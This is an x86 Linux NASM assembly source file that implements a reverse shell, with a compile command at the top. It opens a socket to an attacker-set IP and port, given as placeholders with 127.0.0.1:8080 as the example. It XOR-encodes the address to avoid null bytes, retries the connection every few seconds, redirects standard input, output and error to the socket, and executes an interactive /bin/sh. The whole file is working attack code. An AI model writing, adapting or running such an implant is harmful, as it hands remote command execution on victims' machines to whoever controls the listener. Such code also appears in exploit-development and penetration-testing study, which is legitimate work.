; compile : nasm -f elf32 reverser.asm && ld -m elf_i386 reverser.o -o reverseshell
global      _start

section .text

    arg0        db      "/bin/sh", 0
    arg1        db      "-i", 0
    env0        db      "PS1=\n[\t] \u@\h \w\n\\$ : ", 0
    argv        dd      arg0, arg1, 0
    envv        dd      env0, 0

    timeval:
        tv_sec  dd      0x05
        tv_usec dd      1

    IP_ADDRESS  equ     -ip_address-    ; 0xfeffff80
    PORT        equ     -port-          ; 0x901F
    AF_INET     equ     0x2
    SOCK_STREAM equ     0x1

    SOCKET      equ     0x167
    CONNECT     equ     0x16a
    DUP         equ     0x3f
    EXECVE      equ     0xb


_start:
; We first need to create a socket
; In C it would be like int host_sock = socket(AF_INET, SOCK_STREAM, protocol);
    mov         ax, SOCKET      ; socketcall (102)
    mov         bl, AF_INET     ;
    mov         cl, SOCK_STREAM
    mov         dl, 0x6
    int         80h             ; execute

; Then connect to ip and port
    xchg        edi, eax
    xor         ecx, ecx
    mov         ecx, IP_ADDRESS ; ip_address = 127.0.0.1 = 7F000001: need to put it in reverse : 0100007f xored with ffffffff : feffff80
    xor         ecx, 0xffffffff ; xoring ip address twice to avoid storing nullbyte
    push        ecx
    push        word PORT       ; port = 8080 = 1F90; need to put it in reverse
    push        word AF_INET    ; AF_INET (2)
    mov         ecx, esp
    push        byte 0x10
    pop         edx

    mov         ebx, edi
    mov         ax, CONNECT
    int         80h             ; execute
    inc         eax
    cmp         eax, 1
    jne         retry
    jmp         continue

; If connection fails
retry:
    xchg        edi, ebx
    xor         eax, eax
    mov         al, 162
    mov         ebx, timeval
    xor         ecx, ecx
    int         80h
; Then connect to ip and port
    mov         ecx, IP_ADDRESS ; ip_address = 127.0.0.1 = 7F000001: need to put it in reverse : 0100007f xored with ffffffff : feffff80
    xor         ecx, 0xffffffff ; xoring ip address twice to avoid storing nullbyte
    push        ecx
    push        word PORT       ; port = 8080 = 1F90; need to put it in reverse
    push        word AF_INET    ; AF_INET (2)
    mov         ecx, esp
    push        0x10
    pop         edx

    mov         ebx, edi
    mov         ax, CONNECT
    int         80h             ; execute
    inc         eax
    cmp         eax, 1
    jne         retry

continue:
; Get input and redirect output
    xchg        ebx, edi
    push        0x2
    pop         ecx

loop:
    mov         al, 0x3f
    int         80h
    dec         ecx
    jns         loop

; Execute a shell
    mov         ebx, arg0
    mov         ecx, argv
    mov         edx, envv

    mov         al, EXECVE
    int         80h
